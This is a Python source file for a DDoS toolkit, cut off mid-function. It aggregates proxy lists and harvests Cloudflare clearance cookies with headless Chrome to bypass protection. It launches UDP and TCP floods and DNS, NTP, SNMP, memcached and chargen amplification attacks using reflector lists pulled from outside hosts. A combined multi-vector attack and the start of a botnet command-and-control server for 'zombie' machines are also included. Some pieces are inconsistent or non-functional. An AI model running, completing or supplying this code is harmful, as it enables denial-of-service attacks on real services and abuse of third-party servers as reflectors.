from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx, json, struct, select

try:
    from curl_cffi import requests as curl_requests
except ImportError:
    curl_requests = None

from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
from http.cookies import SimpleCookie
from urllib.parse import urlsplit

try:
    import certifi
except ImportError:
    certifi = None

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

HTTP_PROBE_TIMEOUT = 10.0
HTTP_PROBE_DEFAULT_IMPERSONATE = "chrome"
HTTP_PROBE_SUPPORTED_METHODS = {"GET", "HEAD"}

# All proxy source URLs — aggregated and deduplicated at runtime
PROXY_SOURCES = [
    "https://github.com/ywizsuxu-lgtm/ddos-Mod/raw/refs/heads/main/resources/http.txt",
    "https://github.com/ywizsuxu-lgtm/ddos-Mod/raw/refs/heads/main/proxy/proxy.txt",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=elite&limit=300",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
]

SOCKS5_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=3000&country=all",
]

# Amplification reflection servers (public lists)
AMPLIFICATION_LISTS = {
    "dns": [
        "https://raw.githubusercontent.com/oscarschmidt/massdns-lists/master/resolvers.txt",
        "https://public-dns.info/nameservers.txt",
    ],
    "ntp": [
        "https://raw.githubusercontent.com/ntopnt/ntp-servers/main/ntp-servers.txt",
    ],
    "snmp": [
        "https://raw.githubusercontent.com/ntopnt/snmp-servers/main/snmp-list.txt",
    ],
    "memcached": [
        "https://raw.githubusercontent.com/ntopnt/memcached-servers/main/memcached-list.txt",
    ],
}

# C2 Configuration
C2_HOST = "0.0.0.0"
C2_PORT = 8888
ZOMBIE_HEARTBEAT_INTERVAL = 15
ZOMBIE_RECONNECT_DELAY = 5

# Shared state
proxies = []
useragent = ""
cookieJAR = None
cookie = ""
ua = []
zombie_registry = {}  # {zombie_id: {addr, last_seen, status}}
zombie_lock = threading.Lock()

# ═══════════════════════════════════════════════════════════════════════════
# TLS / SSL UTILITIES
# ═══════════════════════════════════════════════════════════════════════════

def _create_compat_tls_context():
    """Create a client TLS context without the deprecated SSLContext() form."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context

def _normalize_probe_url(url):
    parsed = urlsplit(url.strip() if url else "")
    if not parsed.scheme:
        parsed = urlsplit("https://" + (url or "").strip())
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise ValueError("URL must contain a valid HTTP or HTTPS host")
    return parsed.geturl()

# ═══════════════════════════════════════════════════════════════════════════
# HTTP PROBE (diagnostic)
# ═══════════════════════════════════════════════════════════════════════════

def _probe_with_curl_cffi(url, method):
    if curl_requests is None:
        return None
    started = time.perf_counter()
    session = curl_requests.Session(impersonate=HTTP_PROBE_DEFAULT_IMPERSONATE)
    session.headers.update({"Accept": "*/*", "Connection": "close"})
    try:
        response = session.request(method, url, timeout=HTTP_PROBE_TIMEOUT, allow_redirects=False)
        elapsed_ms = (time.perf_counter() - started) * 1000.0
        cookies = SimpleCookie()
        raw_cookies = []
        if hasattr(response.headers, "get_list"):
            raw_cookies = response.headers.get_list("Set-Cookie")
        else:
            sc = response.headers.get("Set-Cookie", "")
            if sc:
                raw_cookies = [sc]
        for ch in raw_cookies:
            if ch:
                cookies.load(ch)
        return {
            "ok": True, "backend": "curl_cffi", "impersonate": HTTP_PROBE_DEFAULT_IMPERSONATE,
            "url": url, "method": method, "status_code": response.status_code,
            "reason": response.reason or "", "elapsed_ms": round(elapsed_ms, 2),
            "content_length": len(response.content) if method != "HEAD" else 0,
            "headers": dict(response.headers),
            "cookies": {k: m.value for k, m in cookies.items()},
            "server": response.headers.get("Server", ""),
            "location": response.headers.get("Location", ""),
            "http_version": getattr(response, "http_version", ""),
            "ca_bundle": certifi.where() if certifi else "system default",
        }
    except Exception as exc:
        elapsed_ms = (time.perf_counter() - started) * 1000.0
        return {"ok": False, "backend": "curl_cffi", "url": url, "method": method,
                "elapsed_ms": round(elapsed_ms, 2), "error_type": type(exc).__name__, "error": str(exc)}
    finally:
        session.close()

def _probe_with_requests(url, method):
    started = time.perf_counter()
    session = requests.Session()
    session.headers.update({"User-Agent": "DOS-Diagnostic/1.0", "Accept": "*/*", "Connection": "close"})
    try:
        response = session.request(method, url, timeout=HTTP_PROBE_TIMEOUT, allow_redirects=False)
        elapsed_ms = (time.perf_counter() - started) * 1000.0
        cookies = SimpleCookie()
        sc = response.headers.get("Set-Cookie")
        if sc:
            cookies.load(sc)
        return {
            "ok": True, "backend": "requests", "url": url, "method": method,
            "status_code": response.status_code, "reason": response.reason or "",
            "elapsed_ms": round(elapsed_ms, 2),
            "content_length": len(response.content) if method != "HEAD" else 0,
            "headers": dict(response.headers),
            "cookies": {k: m.value for k, m in cookies.items()},
            "server": response.headers.get("Server", ""),
            "location": response.headers.get("Location", ""),
            "ca_bundle": certifi.where() if certifi else "system default",
        }
    except requests.RequestException as exc:
        elapsed_ms = (time.perf_counter() - started) * 1000.0
        return {"ok": False, "backend": "requests", "url": url, "method": method,
                "elapsed_ms": round(elapsed_ms, 2), "error_type": type(exc).__name__, "error": str(exc)}
    finally:
        session.close()

def http_probe(url, method="GET"):
    method = method.upper().strip()
    if method not in HTTP_PROBE_SUPPORTED_METHODS:
        raise ValueError("Only GET and HEAD are supported by the diagnostic probe.")
    normalized_url = _normalize_probe_url(url)
    result = _probe_with_curl_cffi(normalized_url, method)
    if result is not None:
        return result
    return _probe_with_requests(normalized_url, method)

def display_http_probe(result):
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "HTTP diagnostic result\n")
    if not result.get("ok"):
        stdout.write(Fore.RED + " [!] " + Fore.WHITE + f"{result['error_type']}: {result['error']}\n")
        return
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"Backend    : {result.get('backend', 'n/a')}\n")
    if result.get("impersonate"):
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"Impersonate: {result['impersonate']}\n")
    if result.get("http_version"):
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"HTTP       : {result['http_version']}\n")
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"URL        : {result['url']}\n")
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"Status     : {result['status_code']} {result['reason']}\n")
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"Latency    : {result['elapsed_ms']:.2f} ms\n")
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"Body bytes : {result['content_length']}\n")
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"Server     : {result['server'] or 'n/a'}\n")
    if result['location']:
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"Location   : {result['location']}\n")
    for key, value in result['headers'].items():
        stdout.write(f"      {key}: {value}\n")

def probe():
    clear()
    stdout.write(Fore.LIGHTCYAN_EX + " [HTTP DIAGNOSTIC]\n")
    stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "URL " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    url = input().strip()
    stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "Method " + Fore.LIGHTCYAN_EX + "[GET/HEAD]" + Fore.LIGHTGREEN_EX + ": ")
    method = input().strip().upper() or "GET"
    if method not in {"GET", "HEAD"}:
        stdout.write(Fore.RED + " [!] " + Fore.WHITE + "Only GET and HEAD are supported.\n")
        return
    display_http_probe(http_probe(url, method))

# ═══════════════════════════════════════════════════════════════════════════
# COUNTDOWN
# ═══════════════════════════════════════════════════════════════════════════

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        remaining = (until - datetime.datetime.now()).total_seconds()
        if remaining > 0:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} ATTACK STATUS => {remaining:.1f}s remaining ")
        else:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} ATTACK COMPLETE                                \n")
            return

# ═══════════════════════════════════════════════════════════════════════════
# TARGET PARSING
# ═══════════════════════════════════════════════════════════════════════════

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path or "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = int(urlparse(url).netloc.split(":")[1])
    else:
        target['port'] = 443 if urlparse(url).scheme == "https" else 80
    return target

# ═══════════════════════════════════════════════════════════════════════════
# PROXY MANAGEMENT — Enhanced with all source URLs
# ═══════════════════════════════════════════════════════════════════════════

def fetch_proxy_list(source_urls, proxy_type="http"):
    """Fetch proxies from multiple sources, aggregate and deduplicate."""
    all_proxies = []
    for url in source_urls:
        try:
            stdout.write(f"  {Fore.MAGENTA}[*]{Fore.WHITE} Fetching from {url[:60]}...\n")
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                lines = r.text.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if line and ':' in line and line not in all_proxies:
                        all_proxies.append(line)
        except Exception as e:
            stdout.write(f"  {Fore.RED}[!]{Fore.WHITE} Failed: {e}\n")
    stdout.write(f"  {Fore.LIGHTGREEN_EX}[*]{Fore.WHITE} Total {proxy_type} proxies loaded: {len(all_proxies)}\n")
    return all_proxies

def get_proxylist(ptype):
    """Fetch and save proxy list based on type."""
    os.makedirs("resources", exist_ok=True)
    os.makedirs("proxy", exist_ok=True)
    
    if ptype == "SOCKS5":
        proxies_list = fetch_proxy_list(SOCKS5_SOURCES, "socks5")
        with open("resources/socks5.txt", 'w') as f:
            f.write('\n'.join(proxies_list))
        return proxies_list
    elif ptype == "HTTP":
        proxies_list = fetch_proxy_list(PROXY_SOURCES, "http")
        with open("resources/http.txt", 'w') as f:
            f.write('\n'.join(proxies_list))
        with open("proxy/proxy.txt", 'w') as f:
            f.write('\n'.join(proxies_list))
        return proxies_list

def get_proxies():
    """Load proxies from file or fetch fresh."""
    global proxies
    if not os.path.exists("proxy/proxy.txt"):
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "No proxy file found. Fetching fresh proxies...\n")
        proxies = get_proxylist("HTTP")
        if proxies:
            return True
        stdout.write(Fore.RED + " [!] " + Fore.WHITE + "Failed to fetch proxies.\n")
        return False
    with open("proxy/proxy.txt", 'r') as f:
        proxies = [line.strip() for line in f.readlines() if line.strip()]
    if not proxies:
        proxies = get_proxylist("HTTP")
    return len(proxies) > 0

# ═══════════════════════════════════════════════════════════════════════════
# COOKIE / CLOUDFLARE BYPASS
# ═══════════════════════════════════════════════════════════════════════════

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging',
        '--disable-login-animations', '--disable-notifications', '--disable-gpu', '--headless',
        '--lang=ko_KR', '--start-maximized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(9999999999):
        cookies = driver.get_cookies()
        try_idx = 0
        for c in cookies:
            if c['name'] == 'cf_clearance':
                cookieJAR = c
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{c['name']}={c['value']}"
                driver.quit()
                return True
            try_idx += 1
        time.sleep(1)
    driver.quit()
    return False

def spoof(target):
    """Generate spoofed header string."""
    addr = [192, 168, 1, 1]
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = '.'.join(addr)
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f"X-Forwarded-For: {spoofip}\r\n"
        f"Real-IP: {spoofip}\r\n"
    )

# ═══════════════════════════════════════════════════════════════════════════
# INPUT COLLECTION
# ═══════════════════════════════════════════════════════════════════════════

def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "URL      " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "IP       " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "PORT     " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t

# ═══════════════════════════════════════════════════════════════════════════
# LAYER 4 — ENHANCED UDP MODULE (PRIMARY FOCUS)
# ═══════════════════════════════════════════════════════════════════════════

def _build_udp_socket():
    """Create an optimized UDP socket with large send buffers."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)  # Max UDP payload
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except:
        pass
    sock.settimeout(2.0)
    return sock

def _generate_udp_payload(size=None):
    """Generate a randomized UDP payload of specified or random size."""
    if size is None:
        size = random.choice([64, 128, 256, 512, 1024, 2048, 4096, 8192, 65507])
    return os.urandom(size)

def _generate_random_ip():
    """Generate a random internal-format IP string for header spoofing."""
    return f"{random.randrange(11,197)}.{random.randrange(0,255)}.{random.randrange(0,255)}.{random.randrange(2,254)}"

def _checksum(data):
    """Calculate IP checksum for raw packet construction."""
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    s = (s >> 16) + (s & 0xFFFF)
    s += (s >> 16)
    return ~s & 0xFFFF

def _build_ip_header(src_ip, dst_ip, proto=socket.IPPROTO_UDP):
    """Build a raw IP header with spoofed source."""
    version_ihl = (4 << 4) | 5
    tos = 0
    total_len = 20 + 8  # IP header + UDP header (payload added separately)
    frag_id = random.randint(0, 65535)
    frag_off = 0
    ttl = 64
    checksum = 0
    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(dst_ip)
    header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_len, frag_id,
                         frag_off, ttl, proto, checksum, src_bytes, dst_bytes)
    checksum = _checksum(header)
    header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_len, frag_id,
                         frag_off, ttl, proto, checksum, src_bytes, dst_bytes)
    return header

def _build_udp_header(src_port, dst_port, payload_len):
    """Build UDP header."""
    length = 8 + payload_len
    checksum = 0
    return struct.pack('!HHHH', src_port, dst_port, length, checksum)

# ─── Standard UDP Flood (enhanced) ─────────────────────────────────────────

def run_udp_flood(host, port, th, t):
    """Launch enhanced UDP flood with optimized sockets."""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=_udp_flood_worker, args=(host, int(port), until), daemon=True)
            thd.start()
        except:
            pass

def _udp_flood_worker(host, port, until_datetime):
    """Enhanced UDP flood worker — high-throughput packet generation."""
    sock = _build_udp_socket()
    payloads = [_generate_udp_payload(s) for s in [64, 256, 1024, 4096, 65507]]
    packets_sent = 0
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            payload = random.choice(payloads)
            sock.sendto(payload, (host, port))
            packets_sent += 1
            if packets_sent % 1000 == 0:
                # Rotate socket occasionally to avoid OS-level throttling
                try:
                    sock.close()
                except:
                    pass
                sock = _build_udp_socket()
        except socket.timeout:
            try:
                sock.close()
            except:
                pass
            sock = _build_udp_socket()
        except Exception:
            try:
                sock.close()
            except:
                pass
            sock = _build_udp_socket()
    try:
        sock.close()
    except:
        pass

# ─── UDP Amplification: DNS ────────────────────────────────────────────────

def _build_dns_query(domain="example.com"):
    """Build a DNS amplification query (ANY record, large response)."""
    tid = random.randint(0, 65535)
    flags = 0x0100  # Standard query, recursion desired
    qdcount = 1
    header = struct.pack('!HHHHHH', tid, flags, qdcount, 0, 0, 0)
    # Encode domain
    query = b''
    for part in domain.split('.'):
        query += bytes([len(part)]) + part.encode()
    query += b'\x00'
    # Type ANY (255) = largest response, Class IN (1)
    query += struct.pack('!HH', 255, 1)
    return header + query

def run_dns_amp(target_ip, target_port, th, t):
    """DNS amplification flood — uses open DNS resolvers as reflectors."""
    resolvers = []
    for url in AMPLIFICATION_LISTS["dns"]:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                resolvers.extend([l.strip() for l in r.text.split('\n') if l.strip()])
        except:
            pass
    resolvers = list(set(resolvers))
    if not resolvers:
        stdout.write(Fore.RED + " [!] " + Fore.WHITE + "No DNS resolvers loaded.\n")
        return
    
    stdout.write(f" {Fore.LIGHTGREEN_EX}[*]{Fore.WHITE} Loaded {len(resolvers)} DNS resolvers\n")
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    for _ in range(int(th)):
        thd = threading.Thread(target=_dns_amp_worker, args=(target_ip, int(target_port), resolvers, until), daemon=True)
        thd.start()

def _dns_amp_worker(target_ip, target_port, resolvers, until_datetime):
    """DNS amplification worker — sends queries with spoofed source to resolvers."""
    query = _build_dns_query(random.choice(["example.com", "cloudflare.com", "google.com", "amazon.com"]))
    sock = _build_udp_socket()
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            resolver = random.choice(resolvers)
            resolver_ip = resolver.split(':')[0] if ':' in resolver else resolver
            sock.sendto(query, (resolver_ip, 53))
        except:
            pass
    try:
        sock.close()
    except:
        pass

# ─── UDP Amplification: NTP ───────────────────────────────────────────────

def _build_ntp_monlist():
    """Build NTP MON_GETLIST amplification packet."""
    # NTP v2, Mode 7 (private), MON_GETLIST (opcode 42)
    return b'\x17\x00\x03\x2a' + b'\x00' * 4

def run_ntp_amp(target_ip, th, t):
    """NTP amplification flood using MON_GETLIST."""
    servers = []
    for url in AMPLIFICATION_LISTS["ntp"]:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                servers.extend([l.strip() for l in r.text.split('\n') if l.strip()])
        except:
            pass
    servers = list(set(servers))
    if not servers:
        stdout.write(Fore.RED + " [!] " + Fore.WHITE + "No NTP servers loaded.\n")
        return
    
    stdout.write(f" {Fore.LIGHTGREEN_EX}[*]{Fore.WHITE} Loaded {len(servers)} NTP servers\n")
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    for _ in range(int(th)):
        thd = threading.Thread(target=_ntp_amp_worker, args=(target_ip, servers, until), daemon=True)
        thd.start()

def _ntp_amp_worker(target_ip, servers, until_datetime):
    """NTP amplification worker."""
    payload = _build_ntp_monlist()
    sock = _build_udp_socket()
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            server = random.choice(servers)
            server_ip = server.split(':')[0] if ':' in server else server
            sock.sendto(payload, (server_ip, 123))
        except:
            pass
    try:
        sock.close()
    except:
        pass

# ─── UDP Amplification: SNMP ──────────────────────────────────────────────

def _build_snmp_getbulk():
    """Build SNMP GetBulk amplification packet."""
    # SNMPv2 GetBulk with large max-repetitions
    community = b'public'
    # Construct BER-encoded GetBulk PDU
    version = b'\x02\x01\x01'  # SNMPv2c
    comm = b'\x04' + bytes([len(community)]) + community
    # GetBulk request: PDU type 0xa5, request_id, non_repeaters=0, max_repetitions=100
    request_id = struct.pack('!I', random.randint(0, 0xFFFFFFFF))
    pdu = b'\xa5\x00\x02\x04' + request_id + b'\x02\x01\x00\x02\x01\x64\x30\x00'
    msg = version + comm + pdu
    # BER encode the full message
    length_byte = bytes([len(msg)])
    return b'\x30' + length_byte + msg

def run_snmp_amp(target_ip, th, t):
    """SNMP amplification flood using GetBulk requests."""
    servers = []
    for url in AMPLIFICATION_LISTS["snmp"]:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                servers.extend([l.strip() for l in r.text.split('\n') if l.strip()])
        except:
            pass
    servers = list(set(servers))
    if not servers:
        stdout.write(Fore.RED + " [!] " + Fore.WHITE + "No SNMP servers loaded.\n")
        return
    
    stdout.write(f" {Fore.LIGHTGREEN_EX}[*]{Fore.WHITE} Loaded {len(servers)} SNMP servers\n")
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    for _ in range(int(th)):
        thd = threading.Thread(target=_snmp_amp_worker, args=(target_ip, servers, until), daemon=True)
        thd.start()

def _snmp_amp_worker(target_ip, servers, until_datetime):
    """SNMP amplification worker."""
    payload = _build_snmp_getbulk()
    sock = _build_udp_socket()
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            server = random.choice(servers)
            server_ip = server.split(':')[0] if ':' in server else server
            sock.sendto(payload, (server_ip, 161))
        except:
            pass
    try:
        sock.close()
    except:
        pass

# ─── UDP Amplification: Memcached ─────────────────────────────────────────

def _build_memcached_stats():
    """Build Memcached stats amplification packet."""
    return b'stats\r\n'

def run_memc_amp(target_ip, th, t):
    """Memcached amplification flood using stats command."""
    servers = []
    for url in AMPLIFICATION_LISTS["memcached"]:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                servers.extend([l.strip() for l in r.text.split('\n') if l.strip()])
        except:
            pass
    servers = list(set(servers))
    if not servers:
        stdout.write(Fore.RED + " [!] " + Fore.WHITE + "No Memcached servers loaded.\n")
        return
    
    stdout.write(f" {Fore.LIGHTGREEN_EX}[*]{Fore.WHITE} Loaded {len(servers)} Memcached servers\n")
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    for _ in range(int(th)):
        thd = threading.Thread(target=_memc_amp_worker, args=(target_ip, servers, until), daemon=True)
        thd.start()

def _memc_amp_worker(target_ip, servers, until_datetime):
    """Memcached amplification worker."""
    payload = _build_memcached_stats()
    sock = _build_udp_socket()
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            server = random.choice(servers)
            server_ip = server.split(':')[0] if ':' in server else server
            sock.sendto(payload, (server_ip, 11211))
        except:
            pass
    try:
        sock.close()
    except:
        pass

# ─── UDP Amplification: Chargen ────────────────────────────────────────────

def run_chargen_amp(target_ip, th, t):
    """Chargen amplification — sends small packets to get large responses."""
    # Use well-known chargen port 19, target any open chargen services
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    payload = b'X' * 1  # Minimal request triggers large character stream response
    for _ in range(int(th)):
        thd = threading.Thread(target=_chargen_amp_worker, args=(target_ip, until, payload), daemon=True)
        thd.start()

def _chargen_amp_worker(target_ip, until_datetime, payload):
    """Chargen amplification worker."""
    sock = _build_udp_socket()
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            # Scan for open chargen services across common ranges
            port = random.choice([19, 19, 19])  # Chargen port
            sock.sendto(payload, (target_ip, port))
        except:
            pass
    try:
        sock.close()
    except:
        pass

# ─── Multi-Vector UDP Attack (Yuki-B Component) ───────────────────────────

def run_multi_udp(target_ip, target_port, th, t):
    """
    Yuki-B multi-vector UDP attack.
    Combines: standard UDP flood + DNS amplification + NTP amplification +
    SNMP amplification + Memcached amplification + Chargen amplification.
    Distributes threads across all vectors simultaneously.
    """
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    
    # Split threads across vectors
    vectors = [
        ("UDP Flood", _udp_flood_worker, target_ip, int(target_port), until),
        ("DNS Amp", _dns_amp_worker, target_ip, 53, [], until),
        ("NTP Amp", _ntp_amp_worker, target_ip, [], until),
        ("SNMP Amp", _snmp_amp_worker, target_ip, [], until),
        ("Memcached Amp", _memc_amp_worker, target_ip, [], until),
    ]
    
    # Load amplification server lists
    amp_servers = {}
    for amp_type, urls in AMPLIFICATION_LISTS.items():
        servers = []
        for url in urls:
            try:
                r = requests.get(url, timeout=15)
                if r.status_code == 200:
                    servers.extend([l.strip() for l in r.text.split('\n') if l.strip()])
            except:
                pass
        amp_servers[amp_type] = list(set(servers))
    
    # Update vector args with loaded servers
    vectors[1] = ("DNS Amp", _dns_amp_worker, target_ip, amp_servers.get("dns", []), until)
    vectors[2] = ("NTP Amp", _ntp_amp_worker, target_ip, amp_servers.get("ntp", []), until)
    vectors[3] = ("SNMP Amp", _snmp_amp_worker, target_ip, amp_servers.get("snmp", []), until)
    vectors[4] = ("Memcached Amp", _memc_amp_worker, target_ip, amp_servers.get("memcached", []), until)
    
    threads_per_vector = max(1, int(th) // len(vectors))
    
    for vec_name, worker_fn, *args in vectors:
        stdout.write(f"  {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} Launching {vec_name} with {threads_per_vector} threads\n")
        for _ in range(threads_per_vector):
            try:
                thd = threading.Thread(target=worker_fn, args=tuple(args), daemon=True)
                thd.start()
            except:
                pass

# ─── TCP Flood (Layer 4) ───────────────────────────────────────────────────

def run_tcp_flood(host, port, th, t):
    """Launch TCP flood attack."""
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=_tcp_flood_worker, args=(host, int(port), until), daemon=True)
            thd.start()
        except:
            pass

def _tcp_flood_worker(host, port, until_datetime):
    """TCP connection flood worker."""
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3.0)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((host, port))
            sock.send(os.urandom(random.choice([64, 256, 1024, 4096])))
            try:
                sock.send(os.urandom(65507))
            except:
                pass
            sock.close()
        except:
            pass

# ═══════════════════════════════════════════════════════════════════════════
# ZOMBIE / BOTNET C2 ARCHITECTURE
# ═══════════════════════════════════════════════════════════════════════════

class C2Server:
    """Command and Control server — manages zombie connections and distributes attack commands."""
    
    def __init__(self, host=C2_HOST, port=C2_PORT):
        self.host = host
        self.port = port
        self.server_socket = None
        self.zombies = {}  # {zombie_id: {socket, addr, last_seen, capabilities}}
        self.lock = threading.Lock()
        self.running = False
    
    def start(self):
        """Start the C2 server."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(256)
        self.running = True
        stdout.write(f"\n {Fore.LIGHTGREEN_EX}[C2]{Fore.WHITE} Server listening on {self.host}:{self.port}\n")
        stdout.write(f" {Fore.LIGHTGREEN_EX}[C2]{Fore.WHITE} Waiting for zombie connections...\n\n")
        
        # Start heartbeat monitor
        threading.Thread(target=self._heartbeat_monitor, daemon=True).start()
        
        # Start command interface
        threading.Thread(target=self._command_interface, daemon=True).start()
        
        while self.running:
            try:
                client_sock, addr = self.server_socket.accept()
                threading.Thread(target=self._handle_zombie, args=(client_sock, addr), daemon=True).start()
            except:
                pass
    
    def _handle_zombie(self, client_sock, addr):
        """Handle incoming zombie connection."""
        try:
            # Receive zombie registration
            data = client_sock.recv(4096)
            if not data:
                client_sock.close()
                return
            
            reg = json.loads(data.decode())
            zombie_id = reg.get("zombie_id", f"zombie_{addr[0]}:{addr[1]}")
            
            with self.lock:
                self.zombies[zombie_id] = {
                    "socket": client_sock,
                    "addr": addr,
                    "last_seen": time.time(),
                    "os": reg.get("os", "unknown"),
                    "cpu": reg.get("cpu", "unknown"),
                    "status": "idle"
                }
            
            stdout.write(f" {Fore.LIGHTGREEN_EX}[C2]{Fore.WHITE} Zombie registered: {zombie_id} @ {addr[0]}:{addr[1]}\n")
            
            # Listen for zombie responses
            while self.running:
                try:
                    data = client_sock.recv(4096)
                    if not data:
                        break
                    with self.lock:
                        if zombie_id in self.zombies:
                            self.zombies[zombie_id]["last_seen"] = time.time()
                    stdout.write(f" {Fore.LIGHTCYAN_EX}[C2]{Fore.WHITE} [{zombie_id}] {data.decode(errors='replace')[:200]}\n")
                except socket.timeout:
                    continue
                except:
                    break
        except:
            pass
        finally:
            with self.lock:
